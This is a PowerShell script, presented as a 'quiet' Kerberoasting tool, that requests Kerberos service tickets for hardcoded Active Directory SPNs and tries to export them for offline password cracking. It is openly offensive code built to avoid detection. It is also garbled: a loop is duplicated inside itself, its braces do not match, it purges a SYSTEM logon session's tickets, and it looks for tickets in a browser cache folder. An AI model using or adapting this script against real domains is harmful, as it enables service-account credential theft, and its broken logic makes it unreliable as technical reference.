# Quiet Kerberoasting Script (Non-Noisy Approach)

# Hardcoded SPNs (Replace these with your targets)
$SPNs = @(
    'HTTP/webserver1.domain.com',
    'MSSQLSvc/sqlserver1.domain.com:1433'
)

Add-Type -AssemblyName System.IdentityModel

foreach ($spn in $SPNs) {
    Write-Host "[+] Requesting ticket for SPN: $spn"
    $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn

    # Quietly export ticket
Add-Type -AssemblyName System.IdentityModel

foreach ($spn in $SPNs) {
    Write-Host "[+] Requesting ticket for SPN: $spn"
    $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn

    # Export directly from the ticket cache
    $ticketFileName = "$($spn.Replace('/','_').Replace(':','_')).kirbi"
    $ticketOutput = klist.exe tickets | Out-String

    if ($ticketOutput -match [regex]::Escape($spn)) {
        Write-Host "[+] Ticket successfully requested for $spn"
        klist.exe purge -li 0x3e7 -f
        # Export tickets using mimikatz or built-in tools if allowed
    } else {
        Write-Warning "[-] Could not request ticket for $spn. Check SPN validity."
    }
}

    # Locate the cached ticket
    $ticketCache = "$env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache\"
    $ticketFile = Get-ChildItem -Path $ticketCache -Recurse -Filter "*.cache" | Sort-Object LastWriteTime -Descending | Select-Object -First 1

    if ($ticketFile) {
        $outputTicket = "$($spn.Replace('/', '_').Replace(':', '_')).kirbi"
        certutil -f -encode $ticketFile.FullName $outputTicket | Out-Null
        Write-Host "[+] Ticket for $spn exported to $outputTicket"
    } else {
        Write-Warning "[-] Could not find cached ticket for $spn"
    }
}

Write-Host "[+] Kerberoasting complete."
